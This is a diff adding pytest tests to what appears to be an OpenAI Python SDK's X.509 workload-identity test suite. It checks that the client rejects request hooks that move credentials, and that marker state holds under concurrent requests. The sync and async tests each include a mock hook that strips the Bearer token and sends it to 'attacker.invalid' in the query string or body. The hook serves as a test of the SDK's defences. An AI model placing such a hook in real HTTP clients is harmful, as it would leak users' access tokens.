@@ -18,7 +18,12 @@ import pytest
 
 from openai import OpenAI, AsyncOpenAI, OpenAIError
 from openai.auth import X509WorkloadIdentity, x509_workload_identity
-from openai.auth._x509 import _FinalizingRequestHooks
+from openai.auth._x509 import (
+    _ACTIVE_AUXILIARY_TRANSPORT_MARKERS,
+    _ACTIVE_UNPROTECTED_TRANSPORT_SCOPES,
+    _client_transport_scope,
+    _FinalizingRequestHooks,
+)
 
 _TOKEN_URL = "https://mtls.auth.openai.com/oauth/token"
 _API_URL = "https://mtls.api.openai.com/v1/models"
@@ -545,6 +550,40 @@ def test_sync_x509_validates_lazily_delegated_http_client_requests(
         assert factory_delegate.event_hooks["request"] == [redirect_request]
 
 
+@pytest.mark.parametrize("credential_location", ["query", "body"])
+def test_sync_x509_rejects_lazy_delegate_hooks_that_move_credentials_outside_headers(
+    credential_location: str,
+) -> None:
+    requests: list[httpx2.Request] = []
+
+    def relocate_credential(request: httpx2.Request) -> None:
+        token = request.headers.pop("Authorization").removeprefix("Bearer ")
+        request.url = httpx2.URL(f"https://attacker.invalid/capture?credential={token}")
+        if credential_location == "body":
+            request.url = httpx2.URL("https://attacker.invalid/capture")
+            request._content = token.encode()
+        request.headers["host"] = "attacker.invalid"
+        request.extensions.clear()
+
+    class DelegatingClient(httpx2.Client):
+        @override
+        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            delegate = httpx2.Client(
+                transport=httpx2.MockTransport(lambda value: _record(requests, value)),
+                event_hooks={"request": [relocate_credential]},
+            )
+            reconstructed = delegate.build_request(request.method, request.url)
+            reconstructed.headers.update(request.headers)
+            return delegate.send(reconstructed, **kwargs)
+
+    transport = DelegatingClient(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+    with OpenAI(workload_identity=_identity(), http_client=transport, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
 @pytest.mark.parametrize("redirect", [False, True])
 @pytest.mark.parametrize("delegate_source", ["factory", "lazy", "bound", "dispatch"])
 @pytest.mark.parametrize("reconstruct", [False, True])
@@ -595,6 +634,40 @@ async def test_async_x509_validates_lazily_delegated_http_client_requests(
     assert httpx2.AsyncClient._send_single_request is original_dispatch
     if factory_delegate is not None:
         assert factory_delegate.event_hooks["request"] == [redirect_request]
+
+
+@pytest.mark.parametrize("credential_location", ["query", "body"])
+async def test_async_x509_rejects_lazy_delegate_hooks_that_move_credentials_outside_headers(
+    credential_location: str,
+) -> None:
+    requests: list[httpx2.Request] = []
+
+    async def relocate_credential(request: httpx2.Request) -> None:
+        token = request.headers.pop("Authorization").removeprefix("Bearer ")
+        request.url = httpx2.URL(f"https://attacker.invalid/capture?credential={token}")
+        if credential_location == "body":
+            request.url = httpx2.URL("https://attacker.invalid/capture")
+            request._content = token.encode()
+        request.headers["host"] = "attacker.invalid"
+        request.extensions.clear()
+
+    class DelegatingClient(httpx2.AsyncClient):
+        @override
+        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            delegate = httpx2.AsyncClient(
+                transport=httpx2.MockTransport(lambda value: _record(requests, value)),
+                event_hooks={"request": [relocate_credential]},
+            )
+            reconstructed = delegate.build_request(request.method, request.url)
+            reconstructed.headers.update(request.headers)
+            return await delegate.send(reconstructed, **kwargs)
+
+    transport = DelegatingClient(transport=httpx2.MockTransport(lambda request: _record(requests, request)))
+    async with AsyncOpenAI(workload_identity=_identity(), http_client=transport, max_retries=0) as client:
+        with pytest.raises(OpenAIError, match="configured API origin|authorization"):
+            await client.models.list()
+
+    assert [str(request.url) for request in requests] == [_TOKEN_URL]
 
 
 @pytest.mark.parametrize("authorization", [None, "Bearer telemetry-token"])
@@ -1712,6 +1785,103 @@ async def test_async_x509_rejects_auxiliary_hooks_that_add_the_active_access_tok
             await client.models.list()
 
     assert [str(request.url) for request in requests] == [_TOKEN_URL]
+
+
+def test_sync_x509_releases_auxiliary_markers_while_protected_requests_overlap() -> None:
+    first_active = threading.Event()
+    release_first = threading.Event()
+    original_markers = set(_ACTIVE_AUXILIARY_TRANSPORT_MARKERS)
+
+    class ConcurrentClient(httpx2.Client):
+        @override
+        def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                if request.headers.get("Authorization") == "Bearer token-one":
+                    first_active.set()
+                    assert release_first.wait(timeout=10)
+                else:
+                    for _ in range(8):
+                        assert self.get("https://telemetry.example/collect").status_code == 200
+                        assert _ACTIVE_AUXILIARY_TRANSPORT_MARKERS == original_markers
+                    self.build_request("GET", "https://telemetry.example/unsent")
+            return super().send(request, **kwargs)
+
+    def response(request: httpx2.Request) -> httpx2.Response:
+        if str(request.url) == _TOKEN_URL:
+            suffix = json.loads(request.content)["identity_provider_id"].rsplit("-", 1)[-1]
+            return httpx2.Response(200, request=request, json={"access_token": f"token-{suffix}", "expires_in": 3600})
+        return httpx2.Response(200, request=request, json={"object": "list", "data": []})
+
+    transport = ConcurrentClient(transport=httpx2.MockTransport(response))
+    clients = [
+        OpenAI(
+            workload_identity=x509_workload_identity(identity_provider_id=f"idp-{suffix}", service_account_id="svc"),
+            http_client=transport,
+            max_retries=0,
+        )
+        for suffix in ("one", "two")
+    ]
+
+    with ThreadPoolExecutor(max_workers=2) as executor:
+        first = executor.submit(clients[0].models.list)
+        assert first_active.wait(timeout=5)
+        second = executor.submit(clients[1].models.list)
+        assert second.result(timeout=5).object == "list"
+        assert _ACTIVE_AUXILIARY_TRANSPORT_MARKERS == original_markers
+        assert not _client_transport_scope(transport, is_async=False)._auxiliary_request_markers
+        release_first.set()
+        assert first.result(timeout=5).object == "list"
+
+    assert not any(marker not in original_markers for marker in _ACTIVE_UNPROTECTED_TRANSPORT_SCOPES)
+
+
+async def test_async_x509_releases_auxiliary_markers_while_protected_requests_overlap() -> None:
+    first_active = asyncio.Event()
+    release_first = asyncio.Event()
+    original_markers = set(_ACTIVE_AUXILIARY_TRANSPORT_MARKERS)
+
+    class ConcurrentClient(httpx2.AsyncClient):
+        @override
+        async def send(self, request: httpx2.Request, **kwargs: Any) -> httpx2.Response:
+            if request.url.host == "mtls.api.openai.com":
+                if request.headers.get("Authorization") == "Bearer token-one":
+                    first_active.set()
+                    await asyncio.wait_for(release_first.wait(), timeout=10)
+                else:
+                    for _ in range(8):
+                        assert (await self.get("https://telemetry.example/collect")).status_code == 200
+                        assert _ACTIVE_AUXILIARY_TRANSPORT_MARKERS == original_markers
+                    self.build_request("GET", "https://telemetry.example/unsent")
+            return await super().send(request, **kwargs)
+
+    def response(request: httpx2.Request) -> httpx2.Response:
+        if str(request.url) == _TOKEN_URL:
+            suffix = json.loads(request.content)["identity_provider_id"].rsplit("-", 1)[-1]
+            return httpx2.Response(200, request=request, json={"access_token": f"token-{suffix}", "expires_in": 3600})
+        return httpx2.Response(200, request=request, json={"object": "list", "data": []})
+
+    transport = ConcurrentClient(transport=httpx2.MockTransport(response))
+    clients = [
+        AsyncOpenAI(
+            workload_identity=x509_workload_identity(identity_provider_id=f"idp-{suffix}", service_account_id="svc"),
+            http_client=transport,
+            max_retries=0,
+        )
+        for suffix in ("one", "two")
+    ]
+
+    async def request_first() -> Any:
+        return await clients[0].models.list()
+
+    first = asyncio.create_task(request_first())
+    await asyncio.wait_for(first_active.wait(), timeout=5)
+    assert (await clients[1].models.list()).object == "list"
+    assert _ACTIVE_AUXILIARY_TRANSPORT_MARKERS == original_markers
+    assert not _client_transport_scope(transport, is_async=True)._auxiliary_request_markers
+    release_first.set()
+    assert (await asyncio.wait_for(first, timeout=5)).object == "list"
+
+    assert not any(marker not in original_markers for marker in _ACTIVE_UNPROTECTED_TRANSPORT_SCOPES)
 
 
 def test_sync_x509_allows_concurrent_origins_with_the_same_access_token() -> None:
